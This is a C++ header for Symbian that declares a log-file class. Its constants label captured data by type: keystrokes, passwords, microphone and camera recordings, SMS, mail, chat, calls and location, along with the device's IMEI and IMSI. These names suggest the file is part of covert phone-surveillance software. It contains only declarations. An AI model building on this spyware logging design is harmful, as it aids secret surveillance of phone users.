/*
 ============================================================================
 Name		: LogFile.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CLogFile declaration
 ============================================================================
 */

#ifndef LOGFILE_H
#define LOGFILE_H

// INCLUDES

#include <e32std.h>
#include <e32base.h>
#include <f32file.h>

#include "Keys.h"

#include <HT\Phone.h>

#define LOG_DELIMITER 			0xABADC0DE

#define LOGTYPE_UNKNOWN			0xFFFF	// in caso di errore
#define LOGTYPE_FILEOPEN		0x0000
#define LOGTYPE_FILECAPTURE		0x0001	// in realta' e' 0x0000 e si distingue tra LOG e LOGF
#define LOGTYPE_KEYLOG			0x0040
#define LOGTYPE_PRINT			0x0100
#define LOGTYPE_SNAPSHOT		0xB9B9 // Snapshot Agent
#define LOGTYPE_UPLOAD			0xD1D1	
#define LOGTYPE_DOWNLOAD		0xD0D0	
#define LOGTYPE_CALL			0x0140 // Call Agent
#define LOGTYPE_CALL_SKYPE		0x0141
#define LOGTYPE_CALL_GTALK		0x0142
#define LOGTYPE_CALL_YMSG		0x0143
#define LOGTYPE_CALL_MSN		0x0144
#define LOGTYPE_CALL_MOBILE		0x0145
#define LOGTYPE_CALL_SKYPE_NEW		0x0146
#define LOGTYPE_URL			0x0180
#define LOGTYPE_URLCAPTURE		0x0181
#define LOGTYPE_CLIPBOARD		0xD9D9
#define LOGTYPE_PASSWORD		0xFAFA // Password Agent
#define LOGTYPE_MIC			0xC2C2	   // Microphone Agent	
#define LOGTYPE_CHAT			0xC6C6
#define LOGTYPE_CHAT_SKYPE		0x0300
#define LOGTYPE_CAMERA			0xE9E9 // Webcam e Phone Camera Agent
#define LOGTYPE_APPLICATION		0x1011 // Application Agent
#define LOGTYPE_ADDRESSBOOK		0x0200 // Addressbook Windows Mobile
#define LOGTYPE_iADDRESSBOOK		0x0250 // Addressbook iPhone
#define LOGTYPE_CALENDAR		0x0201 // Calendar Agent
#define LOGTYPE_TASK			0x0202 // Tasks
#define LOGTYPE_MAIL_RAW		0x1001
#define LOGTYPE_MAIL			0x0210 // Mail Agent
#define LOGTYPE_SMS				0x0211 // SMS Agent
#define LOGTYPE_MMS				0x0212 // MMS Agent
#define LOGTYPE_LOCATION		0x0220 // Location Agent
#define LOGTYPE_CALLLIST		0x0230 // Call list Agent
#define LOGTYPE_DEVICE			0x0240 // Device info Agent
#define LOGTYPE_INFO			0x0241 // Info Log
#define LOGTYPE_MOUSE			0x0280 // Mouse click agent
#define LOGTYPE_LOCATION_NEW	0x1220
	// sub-types di LOGTYPE_LOCATION_NEW
		#define LOGTYPE_LOCATION_GPS    0x0001
        #define LOGTYPE_LOCATION_GSM    0x0002
        #define LOGTYPE_LOCATION_WIFI   0x0003
        #define LOGTYPE_LOCATION_IP     0x0004
        #define LOGTYPE_LOCATION_CDMA   0x0005
#define LOGTYPE_FILESYSTEM		0xEDA1

// CLASS DECLARATION

/**
 *  CLogFile
 * 
 */
class CLogFile : public CBase
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	IMPORT_C ~CLogFile();

	/**
	 * Two-phased constructor.
	 */
	IMPORT_C static CLogFile* NewL(RFs& aFs);

	/**
	 * Two-phased constructor.
	 */
	IMPORT_C static CLogFile* NewLC(RFs& aFs);

	/**
	 * Methods for Logs management
	 */
	IMPORT_C void CreateLogL(TInt aLogId);
	IMPORT_C void CreateLogL(TInt alogId,TAny* aAdditionalData);
	IMPORT_C void AppendLogL(const TDesC8& aData);
	IMPORT_C void CloseLogL();
	
	/**
	 * Methods for Markup management
	 */
	IMPORT_C void WriteMarkupL(TInt aId, const TDesC8& aData);
	IMPORT_C TBool ExistsMarkupL(TInt aId);
	IMPORT_C HBufC8* ReadMarkupL(TInt aId);
	IMPORT_C HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname);
	
	/**
	 * Method for LogInfo messages
	 */
	//void LogInfoL(const TDesC& aLogInfoMsg);
	
private:
	void RetrieveImeiAndImsiL();
	
	//TInt64 GetFiletime();

	/**
	 * Constructor for performing 1st stage construction
	 */
	CLogFile(RFs& aFs);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();

private:
	RFile iFile;
	TBool iOpened;
	TBool iContainsData;
	RFs& iFs;
	TBuf<CTelephony::KPhoneSerialNumberSize> iImei;
	TBuf<CTelephony::KIMSISize> iImsi;
	TInt iLogId;	// Useful for naming the log file using a meaning name.
	__FLOG_DECLARATION_MEMBER
	};

#endif // LOGFILE_H
